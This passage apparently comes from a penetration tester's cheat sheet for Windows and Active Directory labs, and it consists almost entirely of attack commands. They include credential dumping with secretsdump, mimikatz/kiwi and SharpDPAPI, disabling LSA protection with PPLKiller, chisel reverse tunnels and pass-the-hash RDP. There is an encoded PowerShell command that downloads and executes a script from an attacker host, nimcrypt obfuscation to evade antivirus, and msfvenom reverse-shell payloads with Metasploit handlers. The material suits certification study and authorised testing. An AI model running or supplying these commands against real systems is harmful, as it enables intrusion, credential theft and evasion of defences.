    `"impacket-secretsdump -sam <sam file> -system <system file> local"`
    

Registery copy SAM en SYSTEM

- commands
    
    Other way of getting the files is via `reg`
    
    commands:
    
    save the SAM file**`reg save HKLM\sam <new location>`**
    
    save the SYSTEM file **`reg save HKLM\system <new location>`**
    

If mimikatz has an `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`

Upload PPLkiller https://github.com/RedCursorSecurityConsulting/PPLKiller

- `PPLKiller.exe /installDriver`
- `PPLKiller.exe /disableLSAProtection`

SharpDPAPI to dump windows & chrome credentials

`SharpDPAPI triage`

### Powerview

- Powerview commands
    
    ```powershell
    Get-DomainForeignGroupMember -Domain
    ConvertFrom-SID
    Get-DomainTrustMapping
    Get-DomainTrusts
    ```
    

# Data collection

Sharphound (Bloodhound): 

`Invoke-BloodHound -Domain complyedge.com -CollectionMethod All,GPOLocalGroup -ZipFileName loot.zip`

Powerview enumerate hosts:  `Get-DomainComputer -Domain cyber.local | Resolve-IPAddress`

Bloodhound remotely: https://github.com/fox-it/BloodHound.py

- `bloodhound-python -c all -u <user> -p <password> -d <domain> -dc <> -ns <optional nameserver>`

if it errors on dns use: https://github.com/iphelix/dnschef

- `sudo sh -c 'python3 dnschef.py --fakeip <dc ip> --fakedomains <domain> -q'`

# Pivoting

**RDP (proxychains and PTH)**

- commands
    
    `xfreerdp /v:192.168.136.122  /u:administrator /p:'q7@CobJ3kcm,JB' +compression +clipboard /dynamic-resolution  +toggle-fullscreen /cert-ignore`
    
    RDP PTH: `xfreerdp /v:172.16.136.188  /d:final.com /u:sqlsvc03 /pth:77f944ff6e0c0ed0c83dcef57bdf9298 +compression +clipboard /dynamic-resolution  +toggle-fullscreen /cert-ignore`
    
    If blocked enable with: `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`
    

Chisel

- commands
    
    attacker: `./chisel_linux64 server -p 8000 --reverse`
    
    victim machine: `./chisel_linux64_t4tch3r client 10.50.143.14:8000 R:socks`
    
    uses socks5 
    
    other way
    
    - `/usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver_linux server -p 80 --reverse`
    - `.\chisel_encrypt.exe client 10.10.14.205:80 R:5000:socks`
    

sshuttle → `proxychains -q sshuttle -r [root@172.16.136.197](mailto:root@172.16.136.197) --ssh-cmd "ssh -i id_rsa" 172.16.136.0/24 -x 172.16.136.197`

PSSession

- commands
    
    `Set-Item WSMan:\localhost\Client\TrustedHosts -Value 'dev.htb.local'`
    `Enter-PSSession -ComputerName <machine>`
    
    Invoke-Command + pssession
    
    ```powershell
    Invoke-Command -ScriptBlock {powershell -Sta -Nop -Window Hidden -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAwADUALwByAHUAbgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=} -Session $sess
    ```
    

WMI

- commands
    
    `wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.exe /c " command "`
    

WINRS

- commands
    
    `winrs r:remote-machine.domai.com whoami`

# Obfuscating

nimcrypt2:

`./nimcrypt -f /home/luca/OSEP/luca_data/www/Rubeus.exe -t csharp -g -u -o rubeus-enc.exe`

`./nimcrypt -f /home/luca/htb/cybernetics/www/chisel.exe -t pe -g -u -o chisel_encrypt.exe`

`./nimcrypt -f /home/luca/OSEP/luca_data/www/ProcessHollowing.exe -t csharp -g -u -o /home/luca/OSEP/luca_data/www/phollow-enc.exe`

## Metasploit

- commands
    
    Meterpreter set handler:
    
    Handlers
    
    Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
    
    ```powershell
    use exploit/multi/handler
    set PAYLOAD <Payload name>
    set LHOST <LHOST value>
    set LPORT <LPORT value>
    set ExitOnSession false
    exploit -j -z
    ```
    
    Once the required values are completed the following command will execute your handler – `msfconsole -L -r FILE`  
    
    ### msfconsole enable second stage encoding
    
    `set EnableStageEncoding true`
    
    `set StageEncoder x64/xor_dynamic`
    
    run multiple resource files with handlers
    
    if running the same port do: `resouce ./<resourcefile>`
    
    ### Socks proxy server
    
    `use multi/manage/autoroute`
    
    `set SESSION <number>`
    
    `run`
    
    `use auxiliary/server/socks_proxy`
    
    `set SRVHOST 127.0.0.1`
    
    `set VERSION 4a`
    
    `exploit -j`
    
    ### generate shellcode
    
    vba application 32 bit
    
    `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f vbapplication`
    
    vba application 64 bit
    
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f vbapplication`
    
    powershell 32 bit
    
    `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f ps1`
    
    Powershell 64 bit
    
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f ps1`
    
    C#  64 bit
    
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f csharp`
    
    shellcode without bad characters
    
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 -f csharp -b \x00\x0a\x0d`
    
    full powershell callback
    
    `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.136 LPORT=8443 -f psh -o notcallback.ps1`
    
    Load kiwi:
    
    `load kiwi`
    
    `kiwi_cmd "privilege::debug"`
    
    `kiwi_cmd "token::elevate"`
    
    `kiwi_cmd "sekurlsa::logonpasswords"`
    
    `kiwi_cmd "lsadump::sam"`
    
    `kiwi_cmd "lsadump::secrets"`
    
    `kiwi_cmd "lsadump::cache"`
    
    Load ingognito (to steal tokens)
    
    `load ingognito`
    
    In the session run: `run autoroute -s 10.9.10.0 -n 255.255.255.0` & `run autoroute -s 10.9.15.0 -n 255.255.255.0`
    

flag proof cmd:

`ipconfig && hostname && whoami && type local.txt`

`ipconfig && hostname && whoami && type c:\users\administrator\desktop\proof.txt`

Flag proof Powershell

`ipconfig; hostname; whoami; cat local.txt`

`ipconfig; hostname; whoami; cat c:\users\administrator\desktop\proof.txt`

Flag Linux:

`ip a; hostname; whoami; cat local.txt`

`ip a; hostname; whoami; cat /root/proof.txt`

winrs
